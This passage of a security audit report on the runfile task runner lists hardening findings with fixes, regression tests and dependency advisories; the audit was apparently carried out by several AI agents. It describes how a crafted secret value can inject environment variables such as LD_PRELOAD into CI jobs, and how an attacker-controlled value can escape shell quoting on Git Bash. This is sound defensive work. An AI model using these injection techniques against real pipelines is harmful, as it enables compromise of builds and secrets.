          echo 'RUNFILE_PRIVATE_KEYS<<__RUNFILE_KEYS_EOF__'
          printf '%s\n' "$SECRET_KEYS"
          echo '__RUNFILE_KEYS_EOF__'
        } >> "$GITHUB_ENV"
```

`.github/actions/setup/action.yml:129-139`

```yaml
- name: Register secret keys
  if: inputs.secret-keys != ''
  shell: bash
  env:
    SECRET_KEYS: ${{ inputs.secret-keys }}
  run: |
    {
      echo 'RUNFILE_PRIVATE_KEYS<<__RUNFILE_KEYS_EOF__'
      printf '%s\n' "$SECRET_KEYS"
      echo '__RUNFILE_KEYS_EOF__'
    } >> "$GITHUB_ENV"
```

**Attack path**

A `secret-keys` value containing a line `__RUNFILE_KEYS_EOF__` ends the heredoc early, and every following line is parsed as a further NAME=value (e.g. NODE_OPTIONS, LD_PRELOAD, BASH_ENV) for all later steps. The value normally comes from the consumer's own secrets, so the precondition is a consumer composing it from something less trusted. Separately, nothing calls `::add-mask::` per key, so a key that reaches the log in a form GitHub's secret redaction does not match (e.g. built with format() or read from a file rather than passed straight from `secrets.*`) is printed in clear.

[Also reported by `secrets-crypto`] The input is the consumer's own (normally `${{ secrets.X }}`), so this is defence in depth, not an exploitable path: (1) a line equal to `__RUNFILE_KEYS_EOF__` would end the value and turn every later line into another job environment variable -- GitHub's docs say the delimiter must not occur on a line of its own in the value and advise against the format for arbitrary values; (2) values from the `secrets` context are masked by GitHub, but keys passed from anywhere else (a step output, a vault action, a repository variable) are not, and the action masks nothing; (3) GITHUB_ENV makes RUNFILE_PRIVATE_KEYS visible to every later step of the job, third-party actions included, not just the steps that run `run`.

**Why existing controls don't stop it**

GitHub documents the delimiter rule ("Make sure the delimiter you're using won't occur on a line of its own within the value") and leaves it to the action. Keys passed directly as `${{ secrets.X }}` are redacted by the runner already.

[Also reported by `secrets-crypto`] Values from secrets are masked by the runner; the delimiter is unusual enough that an accidental collision is implausible.

**Impact**

Environment injection into later steps of a consumer's job, or a key in logs, under unusual consumer configurations.

[Also reported by `secrets-crypto`] Hardening: limits how far a mis-supplied key travels and removes an env-injection edge.

**Fix**

Validate and mask each line, then use a random delimiter: `while IFS= read -r k; do [ -z "$k" ] && continue; [[ $k =~ ^[0-9a-fA-F]{64}$ ]] || { echo 'secret-keys: each line must be a 64-character hex key' >&2; exit 1; }; echo "::add-mask::$k"; done <<< "$SECRET_KEYS"; d="EOF_$(openssl rand -hex 16)"; { echo "RUNFILE_PRIVATE_KEYS<<$d"; printf '%s\n' "$SECRET_KEYS"; echo "$d"; } >> "$GITHUB_ENV"`.

[Also reported by `secrets-crypto`] Validate every non-blank line against ^[0-9a-fA-F]{64}$ and fail otherwise (which also rules out the delimiter); emit `::add-mask::<key>` for each line before writing; use a random delimiter; document passing RUNFILE_PRIVATE_KEYS through step-level `env:` to only the steps that need it as the narrower option.

**⚠ Product impact**

*Type:* `behavior`

A malformed key line becomes an error at setup instead of a decryption failure later.

*Safer rollout:* The error says what shape is expected.

**References**

- https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands — multiline GITHUB_ENV delimiter warning; add-mask (retrieved 2026-10-03)

*Reported independently by 2 agents: secrets-crypto, supply-chain-ci.*

---

#### SA-048: `RUNFILE_PRIVATE_KEYS` (the key that decrypts every `.env` secret) is passed to every child a target spawns, including `detach`ed processes

**Severity:** Hardening notes | **Confidence:** Confirmed | **Category:** secrets | **CWE-526** | **Component:** `crates/runfile-runtime (exec.rs, env.rs) + crates/runfile-env`

**Location**

`crates/runfile-runtime/src/exec.rs:349-351`

```rust
for (k, v) in s.env {
	c.env(k, v);
}
```

`crates/runfile-env/src/lib.rs:221-225`

```rust
let base = match params.base_env {
	Some(base) => base,
	None => {
		process = env::vars().collect();
```

**Attack path**

build_env starts from the process environment and nothing removes the key-pool variable; Command also inherits the parent environment. Reproduced with a dummy value (no encrypted values, so the pool is never loaded): `$` line, `exec sh` body, `$` capture and a `detach $` line each saw 16 bytes in RUNFILE_PRIVATE_KEYS. Every tool a target runs (package-manager install scripts, test suites, linters, a detached dev server) can read the master decryption key.

**Why existing controls don't stop it**

No env_remove/env_clear anywhere in runtime, lang or env crates. The variable is already in the caller's environment (in CI the setup action writes it to $GITHUB_ENV for every later step), so runfile does not widen an existing boundary -- hence hardening. A re-exec `$ run x` needs the variable to decrypt, which is the reason not to strip it blindly.

**Impact**

Defence in depth: a compromised dependency executed by any target gets the key that decrypts every committed `encrypted:` value, not just the decrypted values that target was given.

**Fix**

Remove RUNFILE_PRIVATE_KEYS from children by default (`c.env_remove`) and pass it only where the program is the runner itself (`$ run …` re-exec) or behind an explicit opt-in property; in-process `run x` dispatch does not need it in the environment because the key pool is shared in memory.

**⚠ Product impact**

*Type:* `behavior`

A script that re-invokes `run` through some other wrapper, or a tool that itself decrypts runfile secrets, would no longer see the key.

*Safer rollout:* Keep it for children whose program resolves to the current executable; document an opt-in for other cases.

---

#### SA-049: Installers, `run :update` and the setup action call curl -L without restricting protocols, so an HTTPS-to-HTTP redirect from a host or its storage backend is followed and the installer script/archive can be fetched in cleartext

**Severity:** Hardening notes | **Confidence:** Confirmed | **Category:** supply-chain | **CWE-319** | **Component:** `.cicd/release-assets/install.sh, crates/runfile-cli/src/cmd_update.rs, .github/actions/setup/action.yml`

**Location**

`crates/runfile-cli/src/cmd_update.rs:356-358, 586-590`

```rust
.args(["-fsSL", "-o", NULL_DEVICE, "-w", "%{url_effective}", &latest])
...
let out = Command::new("curl")
	.args(["-fsSL", url])
```

`.cicd/release-assets/install.sh:37, 51`

```bash
page="$(curl -fsSL -o /dev/null -w '%{url_effective}' "$releases/latest")"
...
curl -fsSL "$releases/download/$VERSION/$archive" -o "$tmp/$archive"
```

`.github/actions/setup/action.yml:88`

```yaml
curl -fsSL "$url" -o "$RUNNER_TEMP/$archive"
```

`README.md:51`

```
curl -fsSL https://git.joaoverona.com/joaaoverona/runfile/releases/download/latest/install.sh | sh
```

**Attack path**

Release downloads redirect: GitHub to release-assets.githubusercontent.com, Gitea possibly to its attachment storage when SERVE_DIRECT is enabled. curl's default redirect protocols are HTTP, HTTPS, FTP and FTPS (since 7.65.2), so if any hop answers with an http:// Location (a misconfigured storage endpoint or reverse proxy), curl follows it, and a network attacker on that hop can substitute install.sh, which `:update` pipes to `sh`, or the archive. Not exploitable against the current hosts as far as can be seen (Gitea's redirect targets were not probed: no traffic to the project host).

**Why existing controls don't stop it**

All starting URLs are https://. A MITM cannot inject a redirect into the TLS leg. The tag read from the redirect is validated in `:update` (tag_of_page -> is_valid_version_tag), so only the transport matters.

**Impact**

Defence in depth for the one path that executes downloaded code with no signature check.

**Fix**

Use `curl --proto '=https' --tlsv1.2 -fsSL` (and `--proto-redir '=https'` is implied by --proto) in install.sh, cmd_update.rs (both calls), action.yml and the README one-liner; in install.ps1 reject a final URI whose scheme is not https.

**Product impact:** none — internal change only.

**References**

- https://curl.se/libcurl/c/CURLOPT_REDIR_PROTOCOLS_STR.html — default redirect protocols: HTTP, HTTPS, FTP and FTPS (since 7.65.2) (retrieved 2026-10-03)

---

#### SA-050: Setup action's from-source build runs `cargo build` without --locked, so a stale Cargo.lock is silently re-resolved in release jobs and the later `--locked` build accepts the rewritten lockfile

**Severity:** Hardening notes | **Confidence:** Confirmed | **Category:** supply-chain | **CWE-1104** | **Component:** `.github/actions/setup/action.yml (from-source), used by every release build on both forges`

**Location**

`.github/actions/setup/action.yml:107-111`

```yaml
    - name: Build runfile from source
      if: inputs.from-source == 'true'
      shell: bash
      run: |
        cargo build
```

`.cicd/release.yml:107-115`

```yaml
      - name: Setup Runfile (from source)
        uses: ./.github/actions/setup
        with:
          from-source: true
...
      - name: Build release binary
        run: run ci:build
```

`runfiles/ci/build.run:3`

```
$ cargo build --locked --release {{ ARGS }}
```

**Attack path**

If a tagged commit's Cargo.lock does not satisfy Cargo.toml (an edit committed without the lock), the bootstrap `cargo build` resolves the missing/changed entries fresh from crates.io and rewrites Cargo.lock in the workspace; `run ci:build`'s `--locked` then compares against the rewritten file and passes, so the release ships whatever versions were newest at that moment. The release workflows run on the tag push in parallel with CI and do not wait for CI's `git diff --exit-code Cargo.lock` check.

**Why existing controls don't stop it**

`run release` runs `cargo update --workspace` before tagging, which keeps the lock in sync for version bumps, and direct dependencies are `=`-pinned, so the precondition rarely holds; hence hardening.

**Impact**

Lockfile pinning can be bypassed for a release without anyone noticing.

**Fix**

`cargo build --locked` in the from-source step (it is only used internally). Optionally add `git diff --exit-code Cargo.lock` after the build in the release jobs.

**Product impact:** none — internal change only.

**References**

- https://doc.rust-lang.org/cargo/commands/cargo-build.html#manifest-options — --locked: error if Cargo would change the lock file (retrieved 2026-10-03)

---

#### SA-051: anyhow 1.0.102 (RUSTSEC-2026-0190, unsound) is in Cargo.lock only as a wasm32-wasi-p3 build-time dependency of a dev-dependency; never compiled for a shipped target

**Severity:** Hardening notes | **Confidence:** Confirmed | **Category:** supply-chain | **Component:** `workspace (dev-dependency tree)`

**Location**

`Cargo.lock:anyhow 1.0.102 entry`

```
[[package]]
name = "anyhow"
version = "1.0.102"
```

`Cargo.toml:41`

```
tempfile = "=3.27.0"
```

`crates/runfile-cli/Cargo.toml:31-32`

```
[dev-dependencies]
tempfile.workspace = true
```

**Attack path**

RUSTSEC-2026-0190 (published 2026-06-25, informational: unsound; affected <1.0.103): `Error::downcast_mut` after `Error::context` creates a mutable reference that violates borrow rules (UB under Miri). The only path to anyhow in Cargo.lock is tempfile 3.27.0 -> getrandom 0.4.2 -> wasip3 0.4.0 -> wit-bindgen 0.51.0 -> wit-bindgen-rust-macro (a proc-macro) -> wit-bindgen-rust -> wasm-metadata 0.244.0 -> anyhow. tempfile is a [dev-dependencies] entry in every crate that names it; getrandom 0.4.2 pulls wasip3 only under cfg(all(target_arch = "wasm32", target_os = "wasi", target_env = "p3")); and even there anyhow would be used by a proc-macro at compile time. It is never compiled for any of the six release triples, nor for local test builds on Linux, macOS or Windows. No runfile code uses anyhow.

**Why existing controls don't stop it**

Reverse-dependency walk over Cargo.lock (all paths go through tempfile); getrandom-0.4.2/Cargo.toml target table read from the local registry source; `run audit` reports it as an allowed `unsound` warning, exit 0.

**Impact**

None: not built for any supported target, not shipped, and the affected function is not called by this project.

**Fix**

Optional: let the lock entry move to anyhow 1.0.104 (latest, 2026-07-18, not yanked; 1.0.103 is the first fixed release), e.g. `cargo update -p anyhow` via a runfile target. Non-breaking. This mainly silences the `run audit` warning.

**Product impact:** none — internal change only.

**References**

- https://rustsec.org/advisories/RUSTSEC-2026-0190.html — advisory (retrieved 2026-10-03)
- https://osv.dev/vulnerability/RUSTSEC-2026-0190 — affected <1.0.103; function anyhow::Error::downcast_mut (retrieved 2026-10-03)
- https://github.com/dtolnay/anyhow/issues/451 — upstream issue (retrieved 2026-10-03)
- https://crates.io/api/v1/crates/anyhow — 1.0.103 (2026-06-25) and 1.0.104 (2026-07-18), not yanked (retrieved 2026-10-03)

---

#### SA-052: event-listener 5.4.1 (RUSTSEC-2026-0221, unsound) is linked into the Linux `run` binary via secret-service/zbus; the unsound path is not used

**Severity:** Hardening notes | **Confidence:** Confirmed | **Category:** supply-chain | **Component:** `runfile-state (Linux keyring path)`

**Location**

`Cargo.lock:event-listener 5.4.1 entry`

```
[[package]]
name = "event-listener"
version = "5.4.1"
```

`crates/runfile-state/Cargo.toml:23-25`

```
[target.'cfg(target_os = "linux")'.dependencies]
linux-keyutils-keyring-store.workspace = true
secret-service.workspace = true
```

`Cargo.toml:36`

```
secret-service = { default-features = false, features = ["rt-async-io-crypto-rust"], version = "=5.1.0" }
```

**Attack path**

RUSTSEC-2026-0221 (published 2026-07-13, informational: unsound; affected >=5.1.0, <5.4.2): `StackSlot` (the stack listener the `listener!` macro creates) unconditionally implements Send/Sync, so a `!Send` tag set with `Event::with_tag` can be moved to another thread and used from `StackSlot::wait`, a data race in safe code. Path into the build (from Cargo.lock): runfile-state -> secret-service 5.1.0 -> zbus 5.16.0 -> async-broadcast / async-lock / async-process / event-listener-strategy -> event-listener 5.4.1, Linux only, so it is in the shipped Linux binaries and used when `run` talks to the Secret Service for private keys. Reachability: the crate is not a direct dependency and runfile code does not name it. In the registry sources of every dependent (zbus 5.16.0, async-broadcast 0.7.2, async-lock 3.4.2, async-process 2.5.0, async-signal 0.2.14, event-listener-strategy 0.5.4, secret-service 5.1.0), `listener!` is used only in async-lock's OnceCell and async-process's SIGCHLD reaper, both with the default `()` tag (Send), and `with_tag` is called nowhere. The precondition for the data race (a !Send tag) is never met, and no attacker-controlled input reaches it.

**Why existing controls don't stop it**

Grepped dependents' sources for `with_tag` (none) and `listener!` (async-lock once_cell.rs:289/342, async-process reaper/signal.rs:101, default tag). `run audit` (cargo-audit 0.22.2, RustSec DB fetched 2026-10-03, head 2026-10-02) reports it as an allowed `unsound` warning, exit 0; OSV agrees.

**Impact**

None demonstrated: no reachable unsound use. Kept as hygiene because the crate ships in the Linux binary on the keyring path.

**Fix**

Bump the lock entry to event-listener 5.4.2 (released 2026-07-27, not yanked; semver-compatible patch, non-breaking), e.g. `cargo update -p event-listener --precise 5.4.2` from a runfile target per the project's no-direct-cargo rule, then `run test`.

**Product impact:** none — internal change only.

**References**

- https://rustsec.org/advisories/RUSTSEC-2026-0221.html — advisory (retrieved 2026-10-03)
- https://osv.dev/vulnerability/RUSTSEC-2026-0221 — affected >=5.1.0, <5.4.2; informational unsound (retrieved 2026-10-03)
- https://github.com/smol-rs/event-listener/pull/163 — fix (retrieved 2026-10-03)
- https://crates.io/api/v1/crates/event-listener — 5.4.2 max stable, not yanked (retrieved 2026-10-03)

---

#### SA-053: On Windows/Git Bash, MSYS2 re-parses the `-c <script>` command line (de-quoting + wildcard/brace expansion), so a no-whitespace shell body with an interpolated value can lose its self-quoting and be re-globbed by bash

**Severity:** Hardening notes | **Confidence:** Possible | **Category:** injection | **CWE-88** | **Component:** `crates/runfile-runtime (exec.rs) + crates/runfile-lang (value.rs interpolation)`

**Location**

`crates/runfile-runtime/src/exec.rs:171-179`

```rust
fn push_script(c: &mut Command, body: &str) {
	#[cfg(windows)]
	if body.contains('\n') && !body.contains([' ', '\t']) {
		use std::os::windows::process::CommandExt;
		c.arg("-c").raw_arg(windows_quoted(body));
		return;
	}
	c.arg("-c").arg(body);
}
```

`crates/runfile-runtime/src/exec.rs:326-343`

```rust
let mut c = Command::new(&*exe);
c.args(&args).current_dir(s.cwd);
if shell {
	push_script(&mut c, script.as_deref().unwrap_or(s.body));
```

`crates/runfile-lang/src/value.rs:109-129`

```rust
/// POSIX single-quoting: wrap, and close/escape/reopen around any single quote.
pub fn shell_quote(s: &str) -> String { ... out.push('\''); ... }
```

**Attack path**

Interpolation self-quoting (the core safety promise) relies on `shell_quote` wrapping an interpolated value in POSIX single-quotes inside the `$`/`exec` shell body, so bash reads it as one literal word. On Windows the shell is Git Bash's `bash.exe`, an MSYS2 program: per MSYS2's documented behaviour its runtime 'does its best to emulate the command-line wildcard expansion and de-quoting which would be performed by the calling Unix shell' on the raw Windows command line, before bash's own `-c` parser runs (this is exactly why Git special-cases quoting for MSYS2 `sh`, quoting whitespace, backslashes AND curly brackets). Rust's `std::process::Command` quotes an argument only when it contains a space, tab or quote; `push_script` uses `c.arg("-c").arg(body)` for the common single-line case and `windows_quoted` (always wraps in "...") only for the newline-without-space case. So a single-line body with NO whitespace reaches the Windows command line unwrapped: e.g. `$ ./x{{ v }}` with attacker-controlled `v="*"` renders to the body `./x'*'` (no space), Rust passes `bash -c ./x'*'`, MSYS2 de-quotes `./x'*'` to the token `./x*` (the protective single quotes consumed by the MSYS2 layer), and bash then parses `-c ./x*` and glob-expands it -- the value has escaped its quoting. The same MSYS2 layer halves backslash runs (reported for Git Bash argv parsing), so a value with backslashes can be mangled too. Could not be reproduced here (Linux-only harness); rated by code + MSYS2/Rust documentation.

**Why existing controls don't stop it**

The common multi-word body (`echo {{ v }}`, anything with a space) is wrapped by Rust in "...", and MSYS2 suppresses globbing inside double quotes, so the self-quoting holds there -- which is why the corpus's 48/49 interpolation sites are safe. The hole is the single-line, no-whitespace body, which is narrow but real: `$ {{ cmd }}`, `$ prog{{ suffix }}`, or any line that is one token. The shell checker (runfile-shell) reads bash's grammar, not MSYS2's command-line reconstruction, so it does not catch the layer below bash. No `MSYS2_ARG_CONV_EXCL`/`MSYS_NO_PATHCONV` handling or MSYS2-aware quoting exists (contrast Git's `quote_arg_msys2`). Windows + Git Bash only; on Linux/macOS the argv reaches bash directly and the single quotes are honoured.

**Impact**

On Windows, the interpolation self-quoting promise can be defeated for a no-whitespace body: an attacker-controlled value (a `glob` path, captured output, `ARG`/`ARGS` from CI) containing `*`, `?`, `[`, `{...}` or backslashes is re-globbed/word-split or path-mangled by MSYS2 before bash runs it, so the value is interpreted as syntax rather than data -- the exact boundary the self-quoting exists to hold. Realistic worst case is a glob matching an attacker-placed file changing which path the command acts on.

**Fix**

When the resolved program is an MSYS2 shell on Windows, quote the `-c` argument with MSYS2's rules rather than relying on Rust's CommandLineToArgvW quoting: always wrap the script in a form MSYS2 will not de-quote/expand (e.g. a leading-noglob marker or `raw_arg` with MSYS2-correct escaping of whitespace, backslashes and `{}`), as Git's `quote_arg_msys2` does; or set `MSYS2_ARG_CONV_EXCL=*` / disable the MSYS2 argv munging for the spawn. At minimum, always wrap the `-c` body in double quotes on Windows (extend `windows_quoted` to the whitespace case) so MSYS2 globbing is suppressed.

**⚠ Product impact**

*Type:* `behavior`

Windows users' no-whitespace `$` lines would be quoted differently; a target that (perhaps unknowingly) relied on MSYS2 glob-expanding an unquoted single-token body would change behaviour.

*Safer rollout:* Confirm on a Windows/Git Bash runner first; the change only affects the narrow no-whitespace path and brings it in line with the documented self-quoting guarantee.

**References**

- https://blog.rust-lang.org/2022/01/13/Rust-1.58.0/ — Rust 1.58 removed current-directory search in std::process::Command on Windows (retrieved 2026-10-03)
- https://git.lorimer.id.au/gitweb.git/diff/9e9da23c2765050ff30d34540fbab62a1b4e5d01 — Git special-cases quoting for MSYS2 sh: MSYS2 runtime emulates Unix de-quoting and wildcard expansion on the command line (retrieved 2026-10-03)
- https://claudeissues.com/issue/93618-windows-git-bash-bash-tool-command-line-truncated-at-8175-chars-and-backslash-ru — MSYS2 argv parsing halves backslash runs in Git Bash (retrieved 2026-10-03)

---

## Regression tests

`crates/runfile-cli/tests/security_regression.rs` asserts the secure behaviour for each high finding. When the
audit ended, each test failed against 1.8.2 on its own assertion (a marker file the payload creates inside the
test's temporary directory), not on setup. After the fixes, all ten pass and run with the suite: none is
`#[ignore]`d any longer.

```bash
run test -- --test security_regression
```

| Finding | Tests | Before the fix (1.8.2) | Now |
|---|---|---|---|
| SA-002 | `…_pressing_tab_does_not_run_a_command_spelled_in_a_file_name`, `…_a_backtick_in_a_file_name`, `…_the_script_an_older_run_installed_does_not_run_a_file_name` | `pressing Tab after `run` ran the command spelled in a target's file name` | pass |
| SA-003 | `…_an_interpolation_inside_double_quotes_…`, `…_a_command_string_for_another_shell_…`, `…_inside_a_heredoc_…`, `…_a_value_is_text_wherever_it_sits`, `…_a_value_cannot_end_the_heredoc_it_is_in`, `…_a_value_cannot_end_the_comment_it_is_in` | `a value interpolated inside double quotes was run as a command: Deploying ''` (and the same for `sh -c "…"` and an `exec bash` heredoc) | pass |
| SA-009 | `…_an_interpolation_inside_shell_arithmetic_does_not_run_its_value` (`$(( ))`, `(( ))`, `[[ -eq ]]`, `let`, `declare -i`) | `a value in a shell arithmetic position ran as a command` | pass |
| SA-001 | `a_runfiles_another_account_owns_is_refused_unless_the_walk_started_in_its_tree`, `a_runfiles_of_ones_own_is_trusted` (runfile-discovery unit tests) | not testable as a CLI test: it needs a directory another uid owns | pass |

The CLI tests are `cfg(unix)`, since they drive bash.

## Dependencies

Live lookups on 2026-10-03:
- `cargo audit --json` against the RustSec database;
- OSV.dev querybatch (214 crates, 22 npm packages);
- `pnpm audit --json` in both editor packages;
- registry integrity hashes for all 37 npm lockfile entries (all match);
- crates.io and registry.npmjs.org for current versions.

Full table and sources: `agents/dependencies.md`. Script output: `dependencies.md`.

| Package | Installed | Advisory | Fixed in | Reachable? | Rated |
|---|---|---|---|---|---|
| `event-listener` | 5.4.1 | [RUSTSEC-2026-0221](https://osv.dev/vulnerability/RUSTSEC-2026-0221), informational (unsound) | 5.4.2 | Linked into the Linux binary via `secret-service` → `zbus`. The unsound path needs a `!Send` tag via `Event::with_tag`, which nothing calls. | Hardening (SA-052) |
| `anyhow` | 1.0.102 | [RUSTSEC-2026-0190](https://osv.dev/vulnerability/RUSTSEC-2026-0190), informational (unsound) | 1.0.103 | No: only under `wasm32-wasi-p3`, as a build-time dependency of a dev-dependency. It is not compiled for any of the six release triples. | Hardening (SA-051) |

- No other advisories in Cargo.lock or either pnpm lockfile.
- None of the packages from the 2026-08-20 `arrayref` crates.io supply-chain attack is in the lock.
- The pinned toolchain (Rust 1.94.1) is five releases behind stable 1.99.0 and out of support (SA-035). No std advisory applies today.
- `@vscode/vsce` and its ~136 transitive packages are in no lockfile at all (SA-015).
- The bigger upgrade project is the RustCrypto stack: `aes-gcm` 0.10 → 0.11 and friends. That is an API migration in `runfile-crypto`, not a patch bump.

## Coverage and limits

**Scope:** the whole repository at `a65dba1` (v1.8.2): all nine crates, both editor integrations, the GitHub setup action, both forges' CI/release workflows, installers, the npm launcher, the repository's own runfiles, and the git history (355 commits, all refs).

**Coverage: 208 of 208 auditable files read.** The coverage script reports 207, because its path normaliser strips the leading dot from `.editorconfig`. That file was read by the supply-chain agent and by the main agent, and holds formatting settings only. 53 more paths were excluded by rule:
- build output (`target/`, `target-linux/`, `editors/vscode/out/`);
- generated tree-sitter files (`parser.c`, `grammar.json`, `node-types.json`);
- vendored tree-sitter headers;
- lockfiles, which were audited by the dependency protocol rather than line by line;
- golden-AST and tree-sitter corpus fixtures;
- documentation and media.

Per-file assignments are in `coverage.tsv`; what each agent read, cleared and could not resolve is in `agents/*.md`.

**How it was done.** This audit resumed an earlier run from the same day, which was interrupted before its agents finished. Every scope was re-run to completion by these agents:

| Agent | Scope |
|---|---|
| untrusted-repo | discovery and every read-only entry point |
| cli | CLI subcommands |
| lang-eval | evaluator, values, functions, shell quoting |
| runtime | walker, spawning, env, dispatch |
| secrets-crypto | crypto, .env, state, keyring, `:env`, history scan |
| lsp | language server |
| parsers | front end and shell checker |
| editors | VS Code extension, tree-sitter |
| supply-chain | CI, release, installers, `:update`, setup action, dependencies |
| sweep | the 16 files left unread by the agents above |

Experiments ran against the HEAD debug binary in an isolated scratch environment: HOME, XDG, config and TMPDIR all in a scratchpad, D-Bus pointed nowhere so the real keyring was never touched, CI variables stripped, memory and time limits applied. They included:
- marker-file proofs;
- strace (no-execution proofs for the LSP);
- about 3,000 generated inputs against the parser and checker;
- a 4-minute ASan/UBSan run on the tree-sitter scanner.

No live host was contacted except read-only advisory and documentation lookups. No source file was changed except the added regression-test file.

**Verification.** All three high findings were re-opened at their cited lines and reproduced by the main agent (`agents/main-sweep.md`), and so was the sweep's arithmetic-context medium (SA-009). Duplicates were merged and severities re-ranked against the deployment picture. 73 raw findings became 53, and every merge and every severity change is recorded with its reason in `curation-log.md`. The raw agent output is kept in `findings-raw/`.

**Not verified on the platform it concerns:**
- SA-053 (MSYS2 re-parsing on Git Bash) is rated *possible* and filed as hardening. If a Windows test confirms it, it is a high.
- The Windows half of SA-010 (`run.exe` in the workspace) is *likely*.
- SA-029's `${command:…}` path is traced through VS Code's source but was not driven in a running VS Code.
- SA-019 (persistent shared runners) depends on fleet configuration not visible from the repository.

**What this audit cannot catch:**

- Runtime and configuration issues only visible in a live environment: the Gitea instance, the runner fleet, npm and marketplace account settings
- Vulnerabilities inside closed-source dependencies and managed services
- Business logic flaws depending on domain knowledge not evident in the code
- Anything introduced after the commit above
- Advisories published after 2026-10-03
